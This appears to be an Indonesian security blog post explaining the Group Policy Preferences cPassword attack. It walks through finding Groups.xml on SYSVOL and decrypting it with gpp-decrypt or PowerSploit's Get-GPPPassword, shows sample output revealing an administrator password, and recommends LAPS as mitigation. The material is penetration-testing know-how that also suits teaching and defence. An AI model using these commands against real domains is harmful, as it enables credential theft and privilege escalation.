---
title: Plaintext Password Extraction through Group Policy Preferences (GPP)
date: 2022-03-06 11:50:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, gpp-attack]     # TAG names should always be lowercase
author: nairpaa
---

**Group Policy Preferences** memungkinkan administrator untuk membuat kebijakan menggunakan *embedded* kredensial. Kredensial ini dienkripsi dan disimpan di *cPassword*. 

Sehubungan dengan kunci AES yang dirilis Microsoft, penyerang dapat mendekripsi password menjadi *clear text*.

Microsoft telah melakukan merilis *patch* **MS14-025**. Meskipun demikian, *patch* tersebut hanya memunculkan *alert* keamanan pada saat menginputkan password di *Group Policy Preferences*.

Serangan ini biasanya digunakan untuk *privilege escalation* dan biasa terjadi pada Windows Server 2008.

### Tujuan 

- *Privilege escalation*

### Prasyarat

- Penyerang menemukan file *group policy* XML (`Groups.xml`) yang berisi password akun lokal yang terenkripsi AES pada *share* **SYSVOL** di Domain Controller.


### Tools

- PowerSploit
- gpp-decrypt



## Tahap exploitasi

### 1. Eksploitasi manual
#### Step 1: Cari file Groups.xml

Cari file `Groups.xml` di *share* **SYSVOL** dan lihat atribut `cPassword`.

#### Step 2: Decrypt the pass

Untuk melakukan dekripsi, gunakan perintah berikut pada Kali Linux:
```bash
➜ gpp-decrypt <encrypted-password>
```

```bash
PS> Import-Module PowerSploit
PS> Get-GPPPassword
```


### 2. Eksploitasi menggunakan PowerSploit

Eksploitasi dapat dilakukan secara otomatis dengan menggunakan **PowerSploit**.
```bash
PS> Import-Module PowerSploit
PS> Get-GPPPassword
 
Changed   : {2020-08-17 11:14:01}
UserNames : {Administrator (built-in)}
NewName   : [BLANK]
Passwords : {WhatAGreatPassword123!}
File      : \\domain.com\SYSVOL\domain.com\Policies\{5AC5C2A3-B893-493E-B03A-D6F9E8BCC8CB}\Machine\Preferences\Groups\Groups.xml
```

## Mitigasi

Secara singkat, sebaiknya password yang ada di *Group Policy Preferences* sebaiknya dihilangkan. Sebagai gantinya bisa menggunakan **Local Administrator Password Solution (LAPS)**.

## Referensi
- https://adsecurity.org/?p=2288
- https://attack.stealthbits.com/plaintext-passwords-sysvol-group-policy-preferences
- https://www.youtube.com/watch?v=jUc1J31DNdw
- https://www.youtube.com/watch?v=CVasZiVPscQ
- https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/